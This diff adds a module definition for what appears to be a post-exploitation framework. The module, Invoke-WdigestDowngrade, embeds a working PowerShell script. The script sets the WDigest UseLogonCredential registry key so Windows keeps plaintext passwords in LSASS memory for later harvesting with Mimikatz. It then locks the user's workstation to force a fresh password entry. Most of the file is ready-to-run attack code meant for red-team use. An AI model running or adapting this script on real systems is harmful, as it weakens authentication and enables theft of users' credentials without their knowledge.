@@ -1,0 +1,128 @@
+name: Invoke-WdigestDowngrade
+authors:
+  - name: Will Schroeder
+    handle: '@harmj0y'
+    link: https://twitter.com/harmj0y
+description: |
+  Modifies the Windows registry to force the WDigest authentication protocol
+  to store credentials in memory in cleartext. This technique targets a security
+  improvement introduced in Windows 8.1/2012 R2 that prevented WDigest from storing
+  plaintext passwords in memory by default.
+
+  By setting the "UseLogonCredential"
+  registry value to 1, the module forces Windows to cache plaintext credentials
+  in LSASS memory during future logons, making them accessible to credential harvesting
+  tools like Mimikatz. This effectively downgrades the system's authentication
+  security to pre-Windows 8.1 behavior.
+
+  This modification does not immediately
+  capture credentials but prepares the system for future credential theft when
+  users log in. It's particularly useful as a persistence technique when combined
+  with other modules that can later extract these credentials from memory.
+software: ''
+tactics: [TA0005]
+techniques: [T1112, T1562.010]
+background: false
+output_extension:
+needs_admin: true
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: NoLock
+    description: Don't lock the workstation after registry change.
+    required: false
+    value: 'False'
+    strict: true
+    suggested_values:
+      - True
+      - False
+  - name: Cleanup
+    description: Switch. Disable the registry key.
+    required: false
+    value: 'False'
+    strict: true
+    suggested_values:
+      - True
+      - False
+script: |
+  function Invoke-LockWorkStation {
+      # region define P/Invoke types dynamically
+      #   stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
+      #   thanks matt and chris :)
+      $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
+      $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+      $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
+
+      $TypeBuilder = $ModuleBuilder.DefineType('Win32.User32', 'Public, Class')
+      $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
+      $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
+      $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
+          @('User32.dll'),
+          [Reflection.FieldInfo[]]@($SetLastError),
+          @($True))
+
+      # Define [Win32.User32]::LockWorkStation()
+      $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('LockWorkStation',
+          'User32.dll',
+          ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
+          [Reflection.CallingConventions]::Standard,
+          [Bool],
+          [Type[]]@(),
+          [Runtime.InteropServices.CallingConvention]::Winapi,
+          [Runtime.InteropServices.CharSet]::Ansi)
+      $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+
+      $User32 = $TypeBuilder.CreateType()
+
+      $Null = $User32::LockWorkStation()
+  }
+
+  function Invoke-WdigestDowngrade {
+      <#
+      .SYNOPSIS
+      Explicitly sets Wdigest on a Windows 8.1/Server 2012 machine to use logon credentials.
+      Locks the screen after so the user must retype their password.
+
+      .PARAMETER NoLock
+      Doesn't lock the screen after registry set.
+
+      .PARAMETER Cleanup
+      Removes the registry key to force UseLogonCredential.
+
+      .LINK
+      https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/
+
+      #>
+      [CmdletBinding()]
+      Param (
+          [Switch] $NoLock,
+          [Switch] $Cleanup
+      )
+
+      if($Cleanup){
+          try {
+              Remove-ItemProperty -Force -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest" -Name "UseLogonCredential" -ErrorAction Stop
+              "Wdigest set to not use logoncredential."
+          }
+          catch {
+              "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential not set"
+          }
+      }
+      else{
+          Set-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value "1"
+          "Wdigest set to use logoncredential."
+
+          if(-not $NoLock){
+              Invoke-LockWorkStation
+              "Workstation locked"
+          }
+      }
+  }
+script_end: Invoke-WdigestDowngrade {{ PARAMS }}
